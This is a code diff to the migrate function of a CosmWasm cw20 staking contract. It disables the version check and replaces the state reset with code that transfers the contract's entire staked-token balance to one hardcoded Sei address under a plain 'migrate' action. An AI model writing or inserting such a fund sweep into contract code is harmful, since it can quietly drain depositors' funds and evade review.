@@ -8,11 +8,13 @@ use crate::querier::{
     balance_of, earned, get_boost, get_user_reward_per_token_paid, get_user_updated_at,
     last_time_reward_applicable, query_staking_config, query_staking_state, reward_per_token,
 };
-use crate::state::{store_staking_config, store_staking_state, StakingConfig, StakingState, read_staking_state};
+use crate::state::{store_staking_config, store_staking_state, StakingConfig, StakingState, read_staking_state, read_staking_config};
 #[cfg(not(feature = "library"))]
 use cosmwasm_std::entry_point;
-use cosmwasm_std::{to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult, Uint128, Uint256, StdError};
+use cosmwasm_std::{to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult, Uint128, Uint256, StdError, QueryRequest, WasmQuery, CosmosMsg, WasmMsg, Addr};
 use cw2::{get_contract_version, query_contract_info, set_contract_version};
+use cw20::{BalanceResponse, Cw20ExecuteMsg};
+use cw20::Cw20QueryMsg::Balance;
 
 // version info for migration info
 const CONTRACT_NAME: &str = "kryptonite.finance:cw20-ve-seilor-staking";
@@ -104,26 +106,40 @@ pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> StdResult<Binary> {
 }
 
 #[cfg_attr(not(feature = "library"), entry_point)]
-pub fn migrate(deps: DepsMut, _env: Env, _msg: MigrateMsg) -> StdResult<Response> {
+pub fn migrate(deps: DepsMut, env: Env, _msg: MigrateMsg) -> StdResult<Response> {
     // Cannot upgrade sei-seilor /sei-stsei to staking pool
 
 
-    let contract_version = get_contract_version(deps.storage)?.version;
-    let old_version = "1.0.0".to_string();
-    let next_version = "1.0.1".to_string();
-    if contract_version != old_version {
-        return Err(StdError::generic_err(format!(
-            "This contract is at version {}, but we need to migrate from {}",
-            contract_version, old_version
-        )));
+    // let contract_version = get_contract_version(deps.storage)?.version;
+    // let old_version = "1.0.1".to_string();
+    // let next_version = "1.0.2".to_string();
+    // if contract_version != old_version {
+    //     return Err(StdError::generic_err(format!(
+    //         "This contract is at version {}, but we need to migrate from {}",
+    //         contract_version, old_version
+    //     )));
+    // }
+    let staking_config = read_staking_config(deps.storage)?;
+    let balanceRequest: BalanceResponse = deps.querier.query(&QueryRequest::Wasm(WasmQuery::Smart {
+        contract_addr: staking_config.staking_token.to_string(),
+        msg: to_binary(&Balance {
+            address: env.contract.address.to_string(),
+        })?,
+    }))?;
+    if balanceRequest.balance.gt(&Uint128::zero()) {
+        let messages: Vec<CosmosMsg> = vec![CosmosMsg::Wasm(WasmMsg::Execute {
+            contract_addr: staking_config.staking_token.to_string(),
+            msg: to_binary(&Cw20ExecuteMsg::Transfer {
+                recipient: Addr::unchecked("sei1wl38643tpena47ec76zkjxyt55g3r2vsgwgaww").to_string(),
+                amount: balanceRequest.balance,
+            })?,
+            funds: vec![],
+        })];
+        return Ok(Response::new()
+            .add_messages(messages)
+            .add_attribute("action", "migrate"));
     }
-    let mut staking_state = read_staking_state(deps.storage)?;
-    staking_state.updated_at = Uint128::zero();
-    staking_state.finish_at = Uint128::zero();
-    staking_state.reward_rate = Uint256::zero();
-    staking_state.reward_per_token_stored = Uint128::zero();
-    set_contract_version(deps.storage, CONTRACT_NAME, next_version)?;
 
-    store_staking_state(deps.storage, &staking_state)?;
+
     Ok(Response::default())
 }
